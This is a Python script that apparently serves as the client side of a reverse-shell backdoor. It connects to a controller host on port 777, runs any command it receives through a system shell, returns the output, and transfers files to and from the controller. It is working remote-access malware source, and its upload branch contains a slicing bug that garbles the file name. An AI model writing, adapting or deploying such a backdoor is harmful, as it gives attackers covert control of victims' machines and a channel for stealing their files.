import socket
import json
import subprocess
import os




def reliable_rcv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def dowload_file(filename):
    f = open(filename, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(filename):
    f = open(filename, 'rb')
    s.send(f.read())

def shell():    
    while True:
        command = reliable_rcv()
        if command == "quit":
            break
        elif command == "help":
            pass

        elif command[:3] == "cd ":
            os.chdir(command[3:])

        elif command == "clear":
            pass

        elif command[:6] == "upload":
            dowload_file(command[:7])

        elif command[:8] == "download":
            upload_file(command[9:])

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 777))

shell()